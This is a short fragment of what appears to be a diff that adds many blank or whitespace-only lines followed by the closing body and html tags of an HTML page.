+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
